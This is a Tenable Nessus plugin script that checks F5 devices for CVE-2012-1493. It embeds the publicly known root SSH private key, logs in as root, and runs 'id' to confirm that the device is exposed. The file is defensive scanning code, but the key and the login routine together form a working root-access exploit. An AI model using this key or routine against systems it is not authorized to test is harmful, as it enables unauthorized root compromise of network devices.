#TRUSTED 1dc43b56e9504dbe9e900be9bb954273b958718481fa9ed56a651a3c990e29b329b8664807ede85d6dd5118528dd4f2369913e42bfd0a46f51469c24db8d842b7d68712b9087db43e3bcf890e7cd0626b458b6173b38facd1c0e757c3640e4d22145ff70fa78431d88b9b27519c87370ad5ce2b541e94410706447fbfd4b73d8499e77426acd4a90f6e1e95c4ca837329f02394e1479a521b81efbbb806beeea0ab74c583f1dd26e165060d1cde22ea363c44b1e2c83f36ce8ba4d6ca36c5ee4dd4a34d5d445921cc0f2895bd04366a68afd5c517197cf477d116c719b6f80381105916c418ae322a01af68901a692ec8787f526892ef8028f702655c4343bd64b1c399771c3064409c41abff15d8ca24893c8b2a341765ccef04ec51c27563bdf23281b79726b443208869e1b684f9664613f9b2594f1fd3f0983f0065f47952176d72d0ebb77646e589eeb87d2c31772552f78c51b4b8a3f70df099cd30064e7d1b03cabd8cf17ef0e131552b6302e335b63f6199c45a5ef5f44185109d15e3551fc2871f9f184b619f62580cbf3458b028086d82a99800d8ebe4e33913ebed914b11afe1eda26c33f0627c946e32045cca69e664c805a76682d1213ec732a1ae2ecf551a92d911119c3d5f44658551b8595abd95cf44efe842261ba70bf3bd6e7de591d4f2bfb6286d3662bacc4353300e5d7af98354671f0aa846ba9df00
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59477);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/07/11");

  script_cve_id("CVE-2012-1493");
  script_bugtraq_id(53897);
  script_xref(name:"EDB-ID", value:"19064");
  script_xref(name:"EDB-ID", value:"19091");

  script_name(english:"F5 Multiple Products Root Authentication Bypass");
  script_summary(english:"Checks if a given public key is valid for root");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote F5 device has an authentication bypass vulnerability.  The
SSH private key for the root user is publicly known.  A remote,
unauthenticated attacker could exploit this to login as root.");
  script_set_attribute(attribute:"see_also", value:"https://www.trustmatta.com/advisories/MATTA-2012-002.txt");
  script_set_attribute(attribute:"see_also", value:"https://support.f5.com/csp/article/K13600");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant fix referenced by F5 advisory SOL13600.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2012-1493");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'F5 BIG-IP SSH Private Key Exposure');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");
include("data_protection.inc");

checking_default_account_dont_report = TRUE;

enable_ssh_wrappers();
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

user = 'root';
private_key ='-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----';
public_key = 'AAAAB3NzaC1yc2EAAAABIwAAAIEAvIhC5skTzxyHif/7iy3yhxuK6/OB13hjPqrskogkYFrcW8OK4VJT+5+Fx7wd4sQCnVn8rNqahw/x6sfcOMDI/Xvn4yKU4t8TnYf2MpUVr4ndz39L5Ds1n7Si1m2suUNxWbKv58I8+NMhlt2ITraSuTU0NGymWOc8+LNi+MHXdLk=';

port = kb_ssh_transport();
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

ret = ssh_login(login:user, pub:public_key, priv:private_key);
if (ret != 0) audit(AUDIT_HOST_NOT, 'affected');

output = ssh_cmd(cmd:'id', nosh:TRUE, nosudo:TRUE);
ssh_close_connection();

if (!output || "uid=" >!< output) audit(AUDIT_RESP_BAD, port, "an 'id' command");

if (report_verbosity > 0)
{
  report =
    '\nNessus authenticated via SSH using the following private key :\n\n' +
    private_key + '\n\n' +
    'After authenticating Nessus executed the "id" command which returned :\n\n' +
    data_protection::sanitize_uid(output:chomp(output)) + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);

